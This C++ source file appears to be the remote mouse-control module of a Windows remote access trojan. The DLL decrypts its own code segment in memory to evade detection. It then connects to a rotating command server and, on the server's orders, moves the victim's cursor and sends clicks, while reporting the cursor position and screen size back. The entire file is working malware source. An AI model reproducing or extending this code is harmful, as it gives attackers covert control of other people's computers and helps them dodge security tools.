#include "../Core/ComponentUtilities.h"
#include "../Core/PELoader.h"
#include "../Core/TcpShortDef.h"
#include <fstream>
#include <shellapi.h>
#include <sstream>
#include <array>

//Components required defines
#define COMPONENT_TYPE ClientTypes::mouse

#pragma section(segment_qdata, read)
store_variable(segment_qdata) QDATA_STORAGE storage { { 0 }, 1 };

HMODULE thisDll;
FILE_MUTEX_STRUCT thisLock;

int main();


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
		{
			thisDll = hinstDLL;
			srand(time(NULL));
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}

	return true;
}

void CALLBACK debug(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	// Although debug will be exported only in debug version add this checkpoint

#ifdef  _DEBUG
	main();
#endif
}

//Error code should be 1000
//This is the signature for thread function
unsigned int WINAPI coInitComponent(LPVOID lpParameter) {
	DBG("Intro ....Locking");
	thisLock = getComponentLock(thisDll);

	if (!thisLock.locked) {
		DBG("Intro ....FAILED");
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....Decrypting module in memory");

	if (!revertRelocatorChanges(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!decryptSegmentInMemory(thisDll, segment_crypt)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}
	if (!rebaseModuleSegment(thisDll)) {
		FreeLibraryAndExitThread(thisDll, 1000);
		return 1000;	//Keep just in case
	}

	DBG("Intro ....main() called");
	main();

	return 1;	//doesn't matter anymore. Just the first errors are important(for the loader)
}

//Returns version from data segment
DWORD getVersion() {
	return storage.version;
}

//Returns the component type
DWORD getType() {
	return (DWORD)COMPONENT_TYPE;
}

//Encripted side
store_code(segment_crypt) void GetDesktopResolution(int& horizontal, int& vertical) {
	RECT desktop;

	// Get a handle to the desktop window
	const HWND hDesktop = GetDesktopWindow();

	// Get the size of screen to the variable desktop
	GetWindowRect(hDesktop, &desktop);

	// The top left corner will have coordinates (0,0)
	// and the bottom right corner will have coordinates
	// (horizontal, vertical)
	horizontal = desktop.right;
	vertical = desktop.bottom;
}
void leftClick() {
	INPUT    Input = { 0 };
	// left down 
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
	::SendInput(1, &Input, sizeof(INPUT));

	// left up
	::ZeroMemory(&Input, sizeof(INPUT));
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	::SendInput(1, &Input, sizeof(INPUT));
}
void rightClick() {
	INPUT    Input = { 0 };
	// left down 
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
	::SendInput(1, &Input, sizeof(INPUT));

	// left up
	::ZeroMemory(&Input, sizeof(INPUT));
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	::SendInput(1, &Input, sizeof(INPUT));
}

//Encripted side
std::array<char, 65000> buffer;

store_code(segment_crypt) bool netloop(HorizonClient& client) {
	std::unique_ptr<PACKET_HEADER> header(new PACKET_HEADER);
	TOKEN_KEY token;

	if (!recvHeader(header.get())) return false;

	client.getToken(token);

	switch ((PacketDataTypes)header->data_type) {
		case PacketDataTypes::flags_cancel_operation: {
			if (!sendHeader(PacketDataTypes::flags_cancelled_operation, 0, "")) return false;
			break;
		}

		case PacketDataTypes::mouse_start:
		{
			while (true) {

				if (client.dataAvailable(0)) {
					if (!recvHeader(header.get())) return false;

					if ((PacketDataTypes)header->data_type == PacketDataTypes::flags_cancel_operation) {
						if (!sendHeader(PacketDataTypes::flags_cancelled_operation, 0, "")) return false;
						break;
					} else if ((PacketDataTypes)header->data_type == PacketDataTypes::mouse_pos) {
						char buffer[8];
						if (!recvData(buffer, 8)) return false;
						SetCursorPos(*(unsigned int*)buffer, *(unsigned int*)(buffer + 4));
					} else if ((PacketDataTypes)header->data_type == PacketDataTypes::mouse_click_left) {
						leftClick();
					} else if ((PacketDataTypes)header->data_type == PacketDataTypes::mouse_click_right) {
						rightClick();

					} else if ((PacketDataTypes)header->data_type == PacketDataTypes::mouse_start) {
						//Do nothing...the server tried to restart the componenet (it thought perhaps that it closed)

					} else return false;
				}

				POINT p;
				if (!GetCursorPos(&p)) {
					sendError("Could not get cursor position");
					return false;
				}
				int screenW, screenH;

				GetDesktopResolution(screenW, screenH);

				client.setToken(token);
				if (!sendHeader(PacketDataTypes::mouse_pos, 16, "")) return false;
				if (!sendData((char*)&screenW, 4)) return false;
				if (!sendData((char*)&screenH, 4)) return false;
				if (!sendData((char*)&p.x, 4)) return false;
				if (!sendData((char*)&p.y, 4)) return false;

				Sleep(20);
			}

			break;
		}
	}

	return true;
}

void callback_userdescriptorChanged(const USERDESCRIPTOR* new_user) {
	updateStoredDescriptor(new_user);
}

store_code(segment_crypt) int main() {
	while (true) {
		try {
			DBG("Connecting");

			std::unique_ptr<USERDESCRIPTOR> user = loadStoredDescriptor(getVersion(), COMPONENT_TYPE);
			HorizonClient client(getNextDNS(), user.get(), thisDll, callback_userdescriptorChanged);

			DBG("Connected");

			if (!client.authentificate(__LINE__)) {
				DBG("Could not authentificate");
				continue;
			}

			// Message pump
			while (true) {
				if (!netloop(client)) break;
			}
			client.closeClient();

			DBG("Connection ended");

		} catch (std::exception ex) {
			DBG("Exeption");
			DBG(ex.what());
			Sleep(1000);
		}
	}

	return 0;
}